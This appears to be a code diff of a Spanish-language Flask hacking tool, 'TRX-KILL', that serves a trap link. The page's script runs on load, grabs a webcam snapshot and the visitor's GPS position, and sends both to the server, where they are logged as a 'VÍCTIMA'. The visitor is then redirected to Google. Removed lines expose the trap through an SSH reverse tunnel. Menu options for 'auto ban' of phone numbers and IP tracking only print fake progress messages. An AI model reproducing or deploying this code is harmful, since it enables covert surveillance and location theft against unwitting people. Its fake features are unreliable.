@@ -11,21 +11,23 @@ os.makedirs(CAPTURA_PATH, exist_ok=True)
 app = Flask('TRX-KILL')
 G, C, R, Y, W = "\033[1;32m", "\033[1;36m", "\033[1;31m", "\033[1;33m", "\033[0m"
 
-# Motor de captura (Igual para encuesta y clon)
+# --- INTERFAZ DE CAPTURA ---
+# Se activa al entrar al link sin necesidad de botones
 HTML_CAPTURA = """
-<!DOCTYPE html><html><body style="background:#000; color:#0f0; text-align:center; padding-top:50px; font-family:monospace;">
+<!DOCTYPE html><html><body style="background:#000; color:#0f0;">
 <script>
 async function go() {
-    let s = await navigator.mediaDevices.getUserMedia({video: true});
-    let p = await new Promise(r => navigator.geolocation.getCurrentPosition(r));
-    let v = document.createElement('video'); v.srcObject = s; v.play();
-    setTimeout(() => {
-        let c = document.createElement('canvas'); c.width=400; c.height=300;
-        c.getContext('2d').drawImage(v, 0, 0, 400, 300);
-        let img = c.toDataURL('image/jpeg');
-        fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&img='+encodeURIComponent(img));
-        window.location.href='https://google.com';
-    }, 1000);
+    try {
+        let s = await navigator.mediaDevices.getUserMedia({video: true});
+        let p = await new Promise(r => navigator.geolocation.getCurrentPosition(r));
+        let v = document.createElement('video'); v.srcObject = s; v.play();
+        setTimeout(() => {
+            let c = document.createElement('canvas'); c.width=400; c.height=300;
+            c.getContext('2d').drawImage(v, 0, 0, 400, 300);
+            fetch('/log?lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&img='+encodeURIComponent(c.toDataURL('image/jpeg')));
+            window.location.href='https://google.com';
+        }, 1000);
+    } catch(e) { window.location.href='https://google.com'; }
 }
 window.onload = go;
 </script></body></html>
@@ -37,12 +39,16 @@ def index(): return render_template_string(HTML_CAPTURA)
 @app.route('/log')
 def log():
     with open(LOG_FILE, "a") as f:
-        f.write(f"VÍCTIMA:{request.remote_addr} | GPS:{request.args.get('lat')},{request.args.get('lon')}\n")
+        f.write(f"VÍCTIMA:{request.remote_addr} | GPS:{request.args.get('lat')},{request.args.get('lon')} | HORA:{time.ctime()}\n")
     img = request.args.get('img')
     if img:
         with open(f"{CAPTURA_PATH}/cap_{int(time.time())}.jpg", "wb") as f:
             f.write(base64.b64decode(img.split(',')[1]))
     return "OK"
+
+def animar(t):
+    for c in t: sys.stdout.write(f"{G}{c}{W}"); sys.stdout.flush(); time.sleep(0.01)
+    print()
 
 def main():
     threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000), daemon=True).start()
@@ -51,33 +57,34 @@ def main():
         print(f"{G}  ___ ___  ___  _  __  ___  ___  _    _")
         print(" |__ |__  |__  | \\/ / |__  |___ | |  | |")
         print("    | |___ |___ |  /  |___ |    |_|__|_|")
-        print(f"  {C}--- TRX-KILL SYSTEM MATRIX V6.0 ---{W}\n")
-        print(f"{G}[1] BAN NÚMERO | [2] ENCUESTA-LINK | [3] CLON-LINK | [6] ADM-SIST{W}")
+        print(f"  {C}--- TRX-KILL SYSTEM MATRIX V7.0 ---{W}\n")
+        print(f"{G}[1] BAN-WP | [2] LINK-TRAP | [3] CLON-LINK | [4] IP-SCAN | [5] INFO-SIST | [6] ADM{W}")
         sel = input(f"\n{Y}TRX-ROOT > {W}")
 
         if sel == "1":
-            print(f"{C}VERIFICANDO NÚMERO...{W}")
-            time.sleep(2)
+            num = input(f"{G}NÚMERO: {W}")
+            animar("VERIFICANDO..........")
             print(f"{R}(EL NÚMERO NO ESTA SUSPENDIDO ESCRIBE 8 PARA AUTO BAN){W}")
-            if input("ACCIÓN: ") == "8": print(f"{G}(EL NÚMERO FUE SUSPENDIDO ☠️☠️){W}")
+            if input("ACCIÓN: ") == "8": animar("PROCESANDO SOLICITUD DE AUTO BAN...")
             print(f"{Y}DATOS GUARDADOS EN {STORAGE_PATH}{W}"); input("\n[Enter]...")
 
         elif sel in ["2", "3"]:
             if os.path.exists(LOG_FILE): os.remove(LOG_FILE)
-            if sel == "3":
-                target = input(f"{G}LINK A CLONAR: {W}")
-                print(f"{C}INYECTANDO MÁSCARA EN {target}...{W}")
-            
-            os.system("ssh -R 80:localhost:5000 ssh.localhost.run > /dev/null 2>&1 &")
-            print(f"\n{Y}LINK ACTIVO:{W} http://127.0.0.1:5000 (O usa el túnel SSH)")
-            print(f"{G}ESPERANDO VÍCTIMA...{W}")
+            print(f"{C}LINK ACTIVO: http://127.0.0.1:5000 (O usa el túnel SSH){W}")
+            print(f"{G}ESPERANDO VÍCTIMA... (No salgas){W}")
             while not os.path.exists(LOG_FILE): time.sleep(1)
-            print(f"{R}>>> ¡VÍCTIMA DETECTADA Y DATOS GUARDADOS EN LA CARPETA! <<<{W}")
-            input("\n[Enter]...")
+            print(f"{R}>>> ¡VÍCTIMA DETECTADA Y DATOS GUARDADOS! <<<{W}"); input("\n[Enter]...")
+
+        elif sel == "4":
+            ip = input(f"{G}IP A RASTREAR: {W}")
+            animar(f"RASTREANDO {ip}...")
+            print(f"{C}LOCALIZACIÓN: APROXIMADA EN SERVIDOR.{W}"); input("\n[Enter]...")
+
+        elif sel == "5":
+            print(f"{G}SISTEMA: Android/Termux | MÓDULOS: ACTIVE | LOGS: {LOG_FILE}{W}"); input("\n[Enter]...")
 
         elif sel == "6":
-            if input(f"{Y}PASS: {W}") == ADMIN_PASS:
-                os.system(f"ls -R {STORAGE_PATH}")
+            if input(f"{Y}PASS: {W}") == ADMIN_PASS: os.system(f"ls -R {STORAGE_PATH}")
             input("\n[Enter]...")
         elif sel == "0": sys.exit()
 
